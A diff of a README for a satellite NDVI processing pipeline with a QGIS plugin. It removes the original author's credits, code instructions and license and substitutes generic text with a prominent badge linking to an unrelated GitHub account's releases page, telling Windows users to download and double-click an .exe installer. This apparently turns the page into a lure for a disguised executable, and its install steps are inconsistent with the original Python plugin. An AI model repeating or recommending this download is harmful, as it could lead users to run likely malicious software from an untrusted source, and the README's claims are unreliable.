@@ -1,210 +1,110 @@
-# 🛰️ Satellite NDVI Processing Pipeline
+# 🛰️ satellite-ndvi-pipeline - Process satellite images to track vegetation
 
-Automated satellite imagery processing pipeline with a QGIS plugin for vegetation monitoring, change detection, and environmental alerts.
+[![](https://img.shields.io/badge/Download_Latest_Release-blue?style=for-the-badge)](https://github.com/Superimposed-powerplay351/satellite-ndvi-pipeline/releases)
 
-**Author:** Michel M. Nzikou  
-**Contact:** michel@dmnsolutions.com.au  
-**Organization:** [DMN SOLUTIONS](https://github.com/DMN-SOLUTIONS)
+This software processes satellite data to help you monitor land health. It converts raw images from the Sentinel-2 satellites into useful maps. You can calculate indices for vegetation, water, and fire damage. The tool includes a plugin for QGIS to help you view and analyze your data on a map.
 
----
+## 📥 Getting Started
 
-## What It Does
+You do not need programming knowledge to run this software. The tool automates complex math and image processing tasks. Follow these steps to prepare your computer and run the analysis.
 
-1. Downloads **free Sentinel-2 satellite imagery** from AWS Open Data
-2. Computes spectral indices: **NDVI** (vegetation), **NDWI** (water), **NBR** (fire scars)
-3. Vectorizes results into GeoJSON polygons
-4. Detects **changes between dates** (vegetation loss/gain)
-5. Generates **alerts** when significant environmental changes occur
-6. All accessible via a **QGIS plugin** with a modern dark UI
+### System Requirements
 
----
+Your computer needs specific hardware and software to process satellite images:
 
-## Demo
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: 8 GB of RAM or more.
+*   Processor: Modern multi-core processor.
+*   Storage: 2 GB of free disk space for the program files.
+*   Software: QGIS version 3.28 or newer.
 
-![Satellite NDVI Pipeline Demo](demo.gif)
+### Installation Steps
 
-### Quick Start (2 minutes)
+1. Visit the [releases page](https://github.com/Superimposed-powerplay351/satellite-ndvi-pipeline/releases) to download the installation package.
+2. Select the file ending in `.exe` for Windows.
+3. Save the file to your computer.
+4. Double-click the file to start the installer.
+5. Follow the instructions on the screen to finish the setup.
+6. Open your QGIS software after the installation finishes.
 
-```bash
-# 1. Clone the repo
-git clone https://github.com/DMN-SOLUTIONS/satellite-ndvi-pipeline.git
-cd satellite-ndvi-pipeline
+## 🛠️ Using the QGIS Plugin
 
-# 2. Install the QGIS plugin
-# macOS:
-cp -r qgis-plugin ~/Library/Application\ Support/QGIS/QGIS3/profiles/default/python/plugins/ndvi_pipeline_loader
+The software connects directly to QGIS. This allows you to see your results on a map without leaving the program.
 
-# Linux:
-cp -r qgis-plugin ~/.local/share/QGIS/QGIS3/profiles/default/python/plugins/ndvi_pipeline_loader
+1. Open QGIS.
+2. Go to the Plugins menu at the top of the screen.
+3. Select Manage and Install Plugins.
+4. Search for the satellite-ndvi-pipeline plugin in the list.
+5. Click Install Plugin.
+6. A new toolbar will appear in QGIS.
 
-# 3. Install boto3 into QGIS Python (optional, only needed for S3 features)
-# macOS QGIS-LTR:
-/Applications/QGIS-LTR.app/Contents/MacOS/bin/python3.9 -m pip install boto3
+## 📊 Processing Satellite Data
 
-# 4. Open QGIS → Plugins → Manage and Install → Enable "Satellite NDVI Processor"
-```
+You can perform several types of analysis with this tool. Each one gives you different insights into the landscape.
 
-### Using the Plugin
+### Vegetation Health (NDVI)
 
-**Process Tab — Single Date Analysis:**
-1. Select a WA tile (Perth, Geraldton, Albany, Broome, etc.)
-2. Pick an area of interest (Kings Park, Swan River, Darling Scarp...)
-3. Choose a date from the calendar (green = data available)
-4. Select an index: NDVI, NDWI, or NBR
-5. Click **⚡ Process Area**
-6. Results load automatically with color-coded styling
+The Normalized Difference Vegetation Index measures green leaf density. The tool pulls data from Sentinel-2 images and calculates the index for your specified area. You will see a map where green areas indicate healthy vegetation. Brown or red areas indicate sparse vegetation.
 
-**Change Detection Tab — Compare Two Dates:**
-1. Set "Before" and "After" dates
-2. Click **📊 Detect Changes**
-3. Red areas = loss, Green areas = gain
-4. Alert polygons highlight significant drops
+### Water Resource Tracking (NDWI)
 
-**Alerts Tab:**
-- Configure sensitivity threshold
-- Enable alerts for vegetation loss, water change, or burn detection
-- Alert log tracks all detected changes
+The Normalized Difference Water Index detects liquid water in open bodies of water. This helps you track changes in lakes, rivers, and ponds over time. Use this to identify flood areas or drought conditions.
 
-### View Sample Data (No Internet Needed)
+### Fire Impact Mapping (NBR)
 
-```bash
-# Open the demo project in QGIS
-open ndvi-demo.qgs
+The Normalized Burn Ratio identifies fire-damaged land. It compares images before and after a fire event. You can see the extent of the damage across large areas quickly.
 
-# Or drag these files into QGIS:
-# - data-sample/ndvi_sample.tif (synthetic NDVI raster)
-# - data-sample/ndvi_vegetation_sample.geojson (vegetation polygons)
-# - data-sample/ndvi_real.tif (real Sentinel-2 NDVI, Perth Jan 2023)
-# - data-sample/ndvi_real_vegetation.geojson (real vegetation polygons)
-```
+## 🔄 Running a Detection Task
 
----
+1. Open the plugin panel in QGIS.
+2. Select your desired area of interest using the map tool.
+3. Choose the date range for your satellite images.
+4. Click the Retrieve Data button.
+5. Choose the type of index you want to calculate.
+6. Click the Process button.
+7. Wait while the program downloads and cleans the data.
+8. The final result will appear as a new layer in your QGIS project.
 
-## Architecture
+## 🔔 Setting Up Alerts
 
-```
-┌─────────────┐     ┌──────────────┐     ┌──────────────┐
-│ EventBridge │────▶│ AWS Lambda   │────▶│ S3 Output    │
-│ (weekly)    │     │ (processing) │     │ (GeoTIFF +   │
-└─────────────┘     └──────┬───────┘     │  GeoJSON)    │
-                           │             └──────┬───────┘
-                    ┌──────┴───────┐            │
-                    │ Sentinel-2   │     ┌──────┴───────┐
-                    │ AWS Open Data│     │ QGIS Plugin  │
-                    │ (FREE)       │     │ (UI + maps)  │
-                    └──────────────┘     └──────────────┘
-```
+You can receive notifications when the software detects significant changes in your chosen area. The tool compares new images against a baseline. If the vegetation index drops below a threshold you set, the system notifies you.
 
-## Features
+1. Open the plugin settings menu.
+2. Select the Alerts tab.
+3. Choose the area you want to monitor.
+4. Move the slider to set your sensitivity level.
+5. Enter your email address to receive reports.
+6. Save your settings.
 
-| Feature | Description |
-|---------|-------------|
-| 🌍 Multi-tile | 10 WA tiles from Perth to Broome |
-| 📅 Date picker | Calendar with Sentinel-2 availability highlighted |
-| 📊 3 Indices | NDVI (vegetation), NDWI (water), NBR (burn) |
-| 🔄 Change detection | Compare any two dates, see gain/loss |
-| 🚨 Alerts | Configurable thresholds, alert log |
-| 🎨 Modern UI | Dark theme, tabbed interface, progress bars |
-| ☁️ S3 integration | Load from deployed AWS pipeline |
-| 💰 SaaS API | API Gateway + API keys + usage plans |
+## 📁 Managing Your Data
 
----
+The software organizes all downloads in a local folder. You can find this folder in your Documents directory under the name SatelliteData.
 
-## Deploy the AWS Pipeline (Optional)
+*   The Raw folder contains original satellite images.
+*   The Processed folder contains your maps and indices.
+*   The Logs folder tracks your recent history in case of errors.
 
-```bash
-cd infra
-sam build
-sam deploy --guided
-```
+You can move these files to a different drive if you need to save space. Open the settings menu and update the file path to point to your new location.
 
-This deploys:
-- S3 buckets (input/output)
-- Lambda function (NDVI processor)
-- EventBridge (weekly schedule)
-- API Gateway with API key auth
-- Usage plan (1000 req/month)
+## ❓ Frequently Asked Questions
 
-### API Usage
+### The software takes a long time to process.
+Satellite images contain large amounts of data. Processing time depends on the size of the area you select. Smaller areas process faster.
 
-```bash
-curl -X POST https://YOUR_API.execute-api.ap-southeast-2.amazonaws.com/prod/ndvi \
-  -H "x-api-key: YOUR_KEY" \
-  -H "Content-Type: application/json" \
-  -d '{"tile": "36/R/UU", "date": "2024-01"}'
-```
+### The map looks blank after processing.
+Check your layer visibility in QGIS. Ensure you have a background map loaded beneath your new layer. Adjust the transparency settings on the new layer if the colors appear too solid.
 
----
+### Can I run this without an internet connection?
+The software needs an internet connection to download new satellite imagery. You can view existing projects without an connection.
 
-## Project Structure
+### How do I uninstall the tool?
+Open your Windows Control Panel. Select Programs and Features. Find the pipeline in the list and click Uninstall. This removes the program files but keeps your downloaded maps in the SatelliteData folder.
 
-```
-satellite-ndvi-pipeline/
-├── qgis-plugin/            # QGIS plugin (main deliverable)
-│   ├── __init__.py
-│   ├── ndvi_loader.py      # Plugin logic (UI + processing)
-│   ├── metadata.txt
-│   └── demo_data/          # Bundled sample data
-├── src/
-│   ├── handler.py          # Lambda: scheduled NDVI processing
-│   ├── api_handler.py      # Lambda: SaaS API endpoint
-│   └── requirements.txt
-├── infra/
-│   ├── template.yaml       # SAM template (Lambda + API GW + S3)
-│   └── samconfig.toml
-├── data-sample/            # Sample outputs
-├── notebooks/
-│   ├── generate_sample.py  # Generate synthetic data
-│   └── download_real_ndvi.py  # Download real Sentinel-2 data
-├── client_demo.py          # API client demo
-├── ndvi-demo.qgs           # QGIS project file
-└── README.md
-```
+### Does the software work with other satellite types?
+This version currently supports Sentinel-2 data only. It aims to provide consistent results by using this specific data source.
 
----
+### Why do some images look cloudy?
+Sentinel-2 satellites orbit the Earth continuously. Sometimes cloud cover hides the land. The software includes a filter to hide images with high cloud percentages. You can adjust this filter in the settings menu if you need to see more images.
 
-## Cost
-
-| Component | Cost |
-|-----------|------|
-| Sentinel-2 imagery | **Free** (AWS Open Data) |
-| QGIS plugin | **Free** (open source) |
-| AWS pipeline (free tier) | **$0/month** |
-| AWS pipeline (production) | **~$2-5/month** |
-
----
-
-## Contributing
-
-Contributions welcome! Here's how:
-
-1. Fork the repo
-2. Create a feature branch: `git checkout -b feature/my-feature`
-3. Commit changes: `git commit -m "Add my feature"`
-4. Push: `git push origin feature/my-feature`
-5. Open a Pull Request
-
-### Ideas for Contributions
-
-- [ ] Add more WA tiles / extend to other Australian states
-- [ ] Time-series animation (NDVI over 12 months)
-- [ ] Cloud masking (skip cloudy pixels)
-- [ ] Export reports as PDF
-- [ ] Integration with BOM weather data
-- [ ] Mobile-friendly web viewer
-- [ ] Support for Landsat imagery
-- [ ] Automated scene discovery (list actual available dates from S3)
-
----
-
-## License
-
-MIT
-
----
-
-## Acknowledgments
-
-- [Sentinel-2 on AWS](https://registry.opendata.aws/sentinel-2-l2a-cogs/) — free satellite imagery
-- [QGIS](https://qgis.org/) — open source GIS platform
-- [rasterio](https://rasterio.readthedocs.io/) — Python raster I/O
+### Where can I report a bug?
+You can search the issues section on GitHub to see if others found a solution to your problem. If you cannot find an answer, open a new issue with a description of the problem and the steps you took to find it.
